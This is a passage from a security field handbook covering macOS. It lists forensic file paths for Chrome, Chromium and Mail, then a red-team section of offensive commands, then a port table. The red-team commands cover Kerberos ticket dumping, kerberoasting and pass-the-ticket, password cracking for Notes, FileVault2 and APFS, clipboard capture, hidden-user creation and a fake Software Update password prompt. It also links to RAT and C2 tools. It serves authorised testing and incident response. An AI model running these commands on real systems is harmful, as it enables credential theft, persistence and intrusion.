" 
%%users.homedir%%/Library/Application 
Support/Google/Chrome 
Canary/*/Extensions/**{10} 
Chrome Extension 
Activity 
%%users.homedir%%/Library/Application 
Support/Google/Chrome/*/Extension Activity 
" 
%%users.homedir%%/Library/Application 
Support/Google/Chrome Canary/*/Extension 
Activity 
Chrome Cache 
%%users.homedir%%/Library/Caches/com.google
.Chrome/Cache.db 
" 
%%users.homedir%%/Library/Caches/Google/Chr
ome/*/Cache/* 
" 
%%users.homedir%%/Library/Caches/Google/Chr
ome Canary/*/Cache/* 
Chrome Media Cache 
%%users.homedir%%/Library/Caches/Google/Chr
ome/*/Media Cache/* 
" 
%%users.homedir%%/Library/Caches/Google/Chr
ome Canary/*/Media Cache/* 
Chrome Application 
Cache 
%%users.homedir%%/Library/Application 
Support/Google/Chrome/*/Application 
Cache/Cache/* 
" 
%%users.homedir%%/Library/Application 
Support/Google/Chrome Canary/*/Application 
Cache/Cache/* 
Chrome GPU Cache 
%%users.homedir%%/Library/Application 
Support/Google/Chrome/*/GPUCache/* 
" 
%%users.homedir%%/Library/Application 
Support/Google/Chrome Canary/*/GPUCache/* 
Chrome PNaCl 
translation cache 
%%users.homedir%%/Library/Caches/Google/Chr
ome/PnaclTranslationCache/* 
" 
%%users.homedir%%/Library/Caches/Google/Chr
ome Canary/PnaclTranslationCache/* 
Chrome Preferences 
Files 
%%users.homedir%%/Library/Preferences/com.g
oogle.Chrome.plist 
" 
%%users.homedir%%/Library/Application 
Support/Google/Chrome/*/Preferences 
173 
" 
%%users.homedir%%/Library/Application 
Support/Google/Chrome Canary/*/Preferences 
CHROMIUM 
Chromium History 
%%users.homedir%%/Library/Application 
Support/Chromium/*/Archived History 
" 
%%users.homedir%%/Library/Application 
Support/Chromium/*/History 
Chromium Cache 
%%users.homedir%%/Caches/Chromium/*/Cache/* 
" 
%%users.homedir%%/Library/Caches/Chromium/*
/Cache/* 
Chromium 
Application Cache 
%%users.homedir%%/Library/Application 
Support/Chromium/*/Application 
Cache/Cache/* 
Chromium Media 
Cache 
%%users.homedir%%/Library/Caches/Chromium/*
/Media Cache/* 
Chromium GPU Cache 
%%users.homedir%%/Library/Application 
Support/Chromium/*/GPUCache/* 
Chromium PNaCl 
translation cache 
%%users.homedir%%/Library/Caches/Chromium/P
naclTranslationCache/* 
Chromium 
Preferences 
%%users.homedir%%/Library/Application 
Support/Chromium/*/Preferences 
Chromium Extensions 
%%users.homedir%%/Library/Application 
Support/Chromium/*/Extensions/**10 
Chromium Extensions 
Activity 
%%users.homedir%%/Library/Application 
Support/Chromium/*/Extension Activity 
MAIL 
Mail Main Folder 
%%users.homedir%%/Library/Mail/V[0-9]/* 
Mail Mailbox 
Directory 
%%users.homedir%%/Library/Mail/V[0-
9]/Mailboxes/* 
Mail IMAP Synched 
Mailboxes 
%%users.homedir%%/Library/Mail/V[0-9]/IMAP-
/* 
Mail POP Synched 
Mailboxes 
%%users.homedir%%/Library/Mail/V[0-9]/POP-
/* 
Mail BackupTOC 
%%users.homedir%%/Library/Mail/V[0-
9]/MailData/BackupTOC.plist 
Mail Envelope Index 
%%users.homedir%%/Library/Mail/V[0-
9]/MailData/Envelope Index 
Mail Opened 
Attachments 
%%users.homedir%%/Library/Mail/V[0-
9]/MailData/OpenedAttachmentsV2.plist 
Mail Signatures by 
Account 
%%users.homedir%%/Library/Mail/V[0-
9]/MailData/Signatures/*.plist 
Mail Downloads 
Directory 
%%users.homedir%%/Library/Containers/com.ap
ple.mail/Data/Library/Mail Downloads/* 
Mail Preferences 
%%users.homedir%%/Library/Preferences/com.a
pple.Mail.plist 
Mail Recent 
Contacts 
%%users.homedir%%/Library/Application 
Support/AddressBook/MailRecents-v4.abcdmr 
Mail Accounts 
%%users.homedir%%/Library/Mail/V[0-
9]/MailData/Accounts.plist 
174 
REFERENCE: 
https://www.sentinelone.com/blog/how-to-reverse-macos-malware-part-one/ 
https://www.sentinelone.com/blog/how-to-reverse-macos-malware-part-two/ 
https://github.com/meirwah/awesome-incident-response#osx-evidence-
collection 
https://github.com/Cugu/awesome-forensics 
https://docs.google.com/spreadsheets/d/1X2Hu0NE2ptdRj023OVWIGp5dqZOw-
CfxHLOW_GNGpX8/edit#gid=1317205466 
https://www.forensicswiki.org/wiki/Mac_OS_X 
https://objective-see.com/downloads/MacMalware_2019.pdf 
https://github.com/thomasareed/presentations/blob/master/ISS%20-%20Incident
%20response%20on%20macOS.pdf 
https://github.com/cedowens/Presentations/blob/master/ACoD_2020_macOS_Post_
Infection_Analysis_.pdf 
https://www.hopperapp.com/ 
https://github.com/pstirparo/mac4n6 
https://www.jaiminton.com/cheatsheet/DFIR/#macos-cheat-sheet 
M
M 
MACOS_Exploit 
RED TEAM 
EXPLOITATION 
MacOS 
macOS SURVEY 
SYSTEM_PROFILER Everything about your MacOS Setup 
system_profiler > ~/Desktop/system_profile.txt 
Show OS Build 
sw_vers 
Cat OS Build 
cat /System/Library/CoreServices/SystemVersion.plist 
Show System Software Version 
sw_vers -productVersion 
Show CPU Brand String 
sysctl -n machdep.cpu.brand_string 
FileVault Status 
fdesetup status 
List All Hardware Ports 
networksetup -listallhardwareports 
Generate Advanced System and Performance Report 
sudo sysdiagnose -f ~/Desktop/ 
175 
Display Status of Loaded Kernel Extensions 
sudo kextstat -l 
Get Password Policy 
pwpolicy getaccountpolicies 
Enumerate Groups 
groups 
Cached Kerberos Tickets (if present) 
klist 
klist -c  
Enrolled in MDM Solution 
sudo /usr/bin/profiles status -type enrollment 
LSREGISTER-Paths are searched for applications to register with the 
Launch Service database. 
/System/Library/Frameworks/CoreServices.framework/Frameworks/Launch
Services.framework/Support/lsregister -dump 
List all packages and apps install history 
cat /Library/Receipts/InstallHistory.plist 
ls -lart /private/var/db/receipts/ 
List All Apps Downloaded from App Store 
# Via Spotlight 
mdfind kMDItemAppStoreHasReceipt=1 
Show All Attached Disks and Partitions 
diskutil list 
Run a wireless network scan: 
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Cur
rent/Resources/airport -s  
Show Current SSID: 
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Cur
rent/Resources/airport -I | awk '/ SSID/ {print substr($0, 
index($0, $2))}' 
Show WiFi Connection History: 
defaults read 
/Library/Preferences/SystemConfiguration/com.apple.airport.preferen
ces | grep LastConnected -A 7 
Bluetooth Status 
176 
defaults read /Library/Preferences/com.apple.Bluetooth 
ControllerPowerState 
Show Memory Statistics 
# One time 
vm_stat 
# Table of data, repeat 10 times total, 1 second wait between each 
poll 
vm_stat -c 10 1 
macOS ENUMERATION 
DNS-SD ENUMERATION ON LOCAL NETWORK 
Printer Services Example 
#Browse local network for services: 
dns-sd  -B  _services._dns-sd._udp  local. 
#Locate devices serving printers services: 
dns-sd  -B  _ipp._tcp  local. 
#Lookup information about device: 
dns-sd  -L "Brother HL-L2350DW series" _ipp._tcp local. 
#Lookup IP information about host: 
dns-sd -Gv4v6 BRW105BAD4B6AD6.local 
SMB Services Example 
#Browse local network for services: 
dns-sd  -B  _services._dns-sd._udp  local. 
#Locate devices serving SMB services: 
dns-sd  -B  _smb._tcp  local. 
#Lookup information about device: 
dns-sd  -L "TimeCapsule" _smb._tcp local. 
#Lookup IP information about host: 
dns-sd -Gv4v6 TimeCapsule.local 
IPPFIND Enumerate/Find Local Printers 
#Locate printers on local network 
ippfind 
#Enumerate hostnames for printers 
ippfind _ipp._tcp,_universal --exec echo '{service_hostname}' \; 
#Advanced enumeration of printers info: 
ippfind _ipp._tcp,_universal --exec dns-sd -G v4 
'{service_hostname}' \; 
Use Bonjour to locate other AFP services on network 
dns-sd -B _afpovertcp._tcp 
Active Directory Enumeration 
dscl "/Active Directory//All Domains" ls /Computers 
dscl "/Active Directory//All Domains" ls /Users 
177 
dscl "/Active Directory//All Domains" read 
/Users/ 
Enumerate Basic Active Directory info for user 
dscl . cat /Users/ 
List Local Accounts with Admin rights 
dscl . read /Groups/admin 
Show domain info and admin AD groups 
dsconfigad -show 
Enumerate Users and Groups and Admins 
dscl . list /Groups 
dscl . list /Users 
dscl . list /Users | grep -v '_' 
dscacheutil -q group 
dscacheutil -q group -a gid 80 
dscacheutil -q user 
List all profiles for user in Open Directory 
dscl -u  -P   profilelist 
/LDAPv3/127.0.0.1/Users/ 
BITFROST (Kerberos on macOS) 
Goal of the project is to enable better security testing around 
Kerberos on macOS devices using native APIs without requiring any 
other framework or packages on the target. 
LIST 
Loop through all of the credential caches in memory and give basic 
information about each cache and each entry within. 
bitfrost -action list 
DUMP TICKETS 
Iterate through the default credential cache. 
bitfrost -action dump -source tickets 
DUMP KEYTABS 
Attempt to dump information from the default keytab 
(/etc/krb5.keytab) which is only readable by root. 
bitfrost -action dump -source keytab 
ASKHASH 
Compute the necessary hashes used to request TGTs and decrypt 
responses. This command requires the plaintext password 
**Supply a base64 encoded version of the password with -bpassword  
178 
bifrost -action askhash -username  lab_admin -domain lab.local -
bpassword YWJjMTIzISEh 
ASKTGT 
Take a plaintext password, a hash, or a keytab entry and request a 
TGT from the DC. 
#With Base64 Password 
bifrost -action asktgt -username lab_admin -domain lab.local -
bpassword YWJjMTIzISEh 
#With Hash 
bifrost -action asktgt -username lab_admin -domain lab.local -
enctype aes256 -hash 
2DE49D76499F89DEA6DFA62D0EA7FEDFD108EC52936740E2450786A92616D1E1 -
tgtEnctype rc4 
#With Keytab 
bifrost -action asktgt -username lab_admin -domain lab.local -
enctype aes256 -keytab test 
DESCRIBE 
Command will parse out the information of a Kirbi file. You need to 
supply -ticket [base64 of Kirbi ticket] 
bifrost -action describe -ticket doIFIDCCBRygBgIEAAUw= 
ASKTGS 
Command will ask the KDC for a service ticket based on a supplied 
TGT. You need to supply -ticket [base64 of kirbi TGT] and -service 
[spn,spn,spn] 
bifrost -action asktgs -ticket doIFIDCUw= -service 
cifs/dc1-lab.lab.local,host/dc1-lab.lab.local 
KERBEROASTING 
Want service ticket to be rc4 and something more crackable, specify 
the -kerberoast true 
bifrost -action asktgs -ticket doIFQUw= -service 
host/dc1-lab.lab.local -kerberoast true 
PTT 
Command takes a ticket (TGT or service ticket) and imports it to a 
specified credential cache or creates a new credential cache.  
bifrost -action ptt -cache new -ticket doIQUw= 
REFERENCE: 
https://github.com/its-a-feature/bifrost 
https://posts.specterops.io/when-kirbi-walks-the-bifrost-4c727807744f 
Dylib Hijacking 
By abusing various features and undocumented aspects of OS X’s 
dynamic loader, attackers need only to ‘plant’ specially crafted 
179 
dynamic libraries to have malicious code automatically loaded into 
vulnerable applications. 
REFERENCE: 
https://objective-see.com/products/dhs.html 
https://github.com/synack/DylibHijack 
https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x 
https://media.defcon.org/DEF%20CON%2023/DEF%20CON%2023%20presentations/DEF%
20CON%2023%20-%20Patrick-Wardle-DLL-Hijacking-on-OSX-UPDATED.pdf 
http://lockboxx.blogspot.com/2019/10/macos-red-teaming-211-dylib-
hijacking.html 
https://theevilbit.github.io/posts/getting_root_with_benign_appstore_apps/ 
AIRSPY (AIRDROP EXPLORATION) 
AirSpy is a tool for exploring Apple's AirDrop protocol 
implementation on i/macOS, from the server's perspective. Dumps 
requests and responses along with a linear code coverage trace of 
the code processing each request. 
REFERENCE: 
https://github.com/nowsecure/airspy 
https://arxiv.org/pdf/1808.03156.pdf 
Crack Apple Secure Notes 
STEP 1: Copy sqlite ‘NotesV#.storedata’ from target located at: 
/Users//Library/Containers/com.apple.Notes/Data/Library/N
otes/ 
#Notes Version based on OS 
Mountain Lion = NotesV1.storedata 
Mavericks = NotesV2.storedata 
Yosemite = NotesV4.storedata 
El Capitan & Sierra = NotesV6.storedata 
High Sierra = NotesV7.storedata 
STEP 2: Download John’s ‘applenotes2john’ and point it at the 
sqlite database. Note this script also extracts the hints if 
present in the database and appends them to the end of the hash 
(Example ‘company logo?’): 
https://github.com/koboi137/john/blob/master/applenotes2john.py 
applenotes2john.py NotesV#.storedata 
NotesV#.storedata:$ASN$*4*20000*caff9d98b629cad13d54f5f3cbae2b85*79
270514692c7a9d971a1ab6f6d22ba42c0514c29408c998:::::company logo? 
STEP 3: Format and load hash into John (--format=notes-opencl) or 
Hashcat (-m 16200) to crack. 
Crack Apple FileVault2 Disk Encryption 
180 
STEP 1: Use dd to extract image of your FileVault2 encrypted disk: 
sudo dd if=/dev/disk2 of=/path/to/filevault_image.dd 
conv=noerror,sync 
STEP 2: Install fvde2john from https://github.com/kholia/fvde2john 
STEP 3: Use hdiutil to attach to dd image: 
hdiutil attach -imagekey diskimage-class=CRawDiskImage -nomount 
/Volumes/path/to/filevault_image.dd 
STEP 4: Obtain the EncryptedRoot.plist.wipekey from “Recovery HD” 
partition 
https://github.com/libyal/libfvde/wiki/Mounting#obtaining-
encryptedrootplistwipekey 
mmls /Volumes/path/to/filevault_image.dd 
fls -r -o 50480752 /Volumes/path/to/filevault_image.dd | grep -i 
EncryptedRoot 
+++++ r/r 130: EncryptedRoot.plist.wipekey 
icat -o 50480752 image.raw 130 > EncryptedRoot.plist.wipekey 
STEP 5: Verify and note the disk mount point for Apple_Corestorage: 
diskutil list 
…/dev/disk3s2 Apple_Corestorage 
STEP 6: Use EncryptedRoot.plist.wipekey with fvdeinfo to retrieve 
the hash: 
sudo fvdetools/fvdeinfo -e EncryptedRoot.plist.wipekey -p blahblah 
/dev/disk3s2 
$fvde$1$16$96836044060108438487434858307513$41000$e9acbb4bc6dafb74a
adb72c576fecf69c2ad45ccd4776d76 
STEP 7: Load this hash into JTR or Hashcat to crack 
john --format=FVDE-opencl --wordlist=dict.txt hash.txt  
hashcat –a 0 –m 16700 hash.txt dict.txt 
Crack Apple File System MacOS up to 10.13 
STEP 1: Install apfs2john per the github instructions located at: 
https://github.com/kholia/apfs2john 
STEP 2: Point ‘apfs2john’ at the your device or disk image: 
sudo ./bin/apfs-dump-quick /dev/sdc1 outfile.txt 
sudo ./bin/apfs-dump-quick image.raw outfile.txt 
181 
!!Consider using ‘kpartx’ for handling disk images per Kholia 
recommendations: https://github.com/kholia/fvde2john 
macOS MISC 
Dump Clipboard Contents Continuously 
while true; do echo -e "\n$(pbpaste)" >>/tmp/clipboard.txt && sleep 
5; done 
Add a hidden user on MacOS 
sudo dscl . -create /Users/#{user_name} UniqueID 333 
Extract All Certificates 
security find-certificate -a -p 
Locate Bookmark Database for Firefox & Chrome 
#Write out to /tmp file: 
find / -path "*/Firefox/Profiles/*/places.sqlite" -exec echo {} >> 
/tmp/firefox-bookmarks.txt \; 
find / -path "*/Google/Chrome/*/Bookmarks" -exec echo {} >> 
/tmp/chrome-bookmarks.txt \; 
Locate Browser History: Safari, Chrome, Firefox 
Parse browser history: 
https://github.com/cedowens/macOS-browserhist-
parser/tree/master/parse-browser-history 
#Safari History 
~/Library/Safari/History.db 
#Chrome History 
~/Library/Application Support/Google/Chrome/Default/History 
#Firefox History 
~/Library/Application Support/Profiles.default-
release/places.sqlite 
Prompt User for Password (Local Phishing) 
osascript -e 'tell app "System Preferences" to activate' -e 'tell 
app "System Preferences" to activate' -e 'tell app "System 
Preferences" to display dialog "Software Update requires that you 
type your password to apply changes." & return & return default 
answer "" with icon 1 with hidden answer with title "Software 
Update"' 
C2 TOOLS 
PUPY 
Pupy is a cross-platform, multi function RAT and post-exploitation 
tool mainly written in python. It features an all-in-memory 
execution guideline and leaves a very low footprint. 
182 
https://github.com/n1nj4sec/pupy 
APFELL 
A cross-platform, post-exploit, red teaming framework built with 
python3, docker, docker-compose, and a web browser UI. It's 
designed to provide a collaborative and user friendly interface for 
operators, managers, and reporting throughout mac and linux based 
red teaming. 
https://github.com/its-a-feature/Apfell 
M
M 
MACOS_Hardening 
BLUE TEAM 
CONFIGURATION 
MacOS 
MacOS Hardening Guide 
https://github.com/ernw/hardening/blob/master/operating_system/osx/
10.14/ERNW_Hardening_OS_X_Mojave.md 
M
M 
MACOS_Ports 
ALL 
INFORMATIONAL 
MacOS 
Historical OSX/macOS services and ports for all versions. 
Port 
Proto 
App Proto 
System Service Name 
7 
TCP/UDP 
echo 
— 
20 
TCP 
ftp-data 
— 
21 
TCP 
ftp 
— 
22 
TCP 
ssh 
Xcode Server ( Git+SSH; 
SVN+SSH) 
23 
TCP 
telnet 
— 
25 
TCP 
smtp 
Mail 
53 
TCP/UDP 
domain 
— 
67 
UDP 
bootps 
NetBoot via DHCP 
68 
UDP 
bootpc 
NetBoot via DHCP 
69 
UDP 
tftp 
— 
79 
TCP 
finger 
— 
80 
TCP 
http 
World Wide Web 
88 
TCP 
kerberos 
Kerberos, Screen Sharing 
authentication 
106 
TCP 
3com-tsmux 
macOS Server Password 
Server 
110 
TCP 
pop3 
Mail 
183 
111 
TCP/UDP 
sunrpc 
Portmap (sunrpc) 
113 
TCP 
ident 
— 
119 
TCP 
nntp 
Apps that read newsgroups. 
123 
UDP 
ntp 
network time server 
synchronization 
137 
UDP 
netbios-ns 
— 
138 
UDP 
netbios-dgm 
Windows Datagram Service 
139 
TCP 
netbios-ssn 
Microsoft Windows file and 
print services 
143 
TCP 
imap 
Mail (receiving email) 
161 
UDP 
snmp 
— 
192 
UDP 
osu-nms 
AirPort Base Station PPP 
status or discovery, 
AirPort Admin Utility, 
AirPort Express Assistant 
311 
TCP 
asip-webadmin 
Server app, Server Admin, 
Workgroup Manager, Server 
Monitor, Xsan Admin 
312 
TCP 
vslmp 
Xsan Admin (OS X Mountain 
Lion v10.8 and later) 
389 
TCP 
ldap 
Apps that look up 
addresses, such as Mail and 
Address Book 
427 
TCP/UDP 
svrloc 
Network Browser 
443 
TCP 
https 
TLS websites 
445 
TCP 
microsoft-ds 
— 
464 
TCP/UDP 
kpasswd 